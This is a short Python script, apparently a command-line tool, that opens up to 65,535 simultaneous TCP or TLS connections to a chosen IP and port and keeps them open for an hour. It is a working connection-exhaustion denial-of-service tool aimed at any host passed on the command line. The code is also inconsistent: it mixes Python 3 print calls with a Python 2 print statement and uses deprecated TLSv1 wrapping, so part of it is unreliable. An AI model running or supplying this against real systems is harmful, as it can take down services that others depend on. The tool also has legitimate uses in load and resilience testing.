import socket
import ssl
import sys
import time
import argparse

def wait(seconds):
    print("waiting for " + str(seconds) + " seconds, so that the connections stay open")
    time.sleep(seconds)
    print("done")
    exit()

parser = argparse.ArgumentParser(description='Make a lot of simultaneous https connections to a single host and keep them open.')
parser.add_argument('--ip', '-i', required=True, type=str, help='ip address target')
parser.add_argument('--port', '-p', required=True, type=int, help='tcp port')
parser.add_argument('--max-requests', '-m', required=False, type=int, default=65535, help='Maximum amount of requests')
parser.add_argument('--wait-time', '-w', required=False, type=int, default=3600, help='Amount of seconds to wait')
parser.add_argument('--enable-tls', '-s', required=False, action='store_true', help='Enable tls for connections')

args = parser.parse_args()

host, port, max_requests, wait_time, enable_tls = args.ip, args.port, args.max_requests, args.wait_time, args.enable_tls

if (port == 443 or "443" in str(port)) and not enable_tls:
    print("Warning: common tls port detected, don't you want to use the switch --enable-tls?")


connection_list = []

start_time = time.time()

try:
    for _ in range(max_requests):
        connection_list.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        if enable_tls:
            wrappedSocket = ssl.wrap_socket(connection_list[_], ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ECDH+AES256")
            wrappedSocket.connect((host, port))
        else:
            connection_list[_].connect((host, port))

        end_time = time.time()
        new_time = end_time - start_time
        str_text = "\rConnection " + str(_ + 1) + " created, Seconds since start: " + str(new_time)
        sys.stdout.write(str_text)
        sys.stdout.flush()
except:
    type, value, traceback = sys.exc_info()
    print("Exception details")
    print(type)
    print(value)
    print "Failed to create connection " + str(_ + 1) + " !"
wait(wait_time)
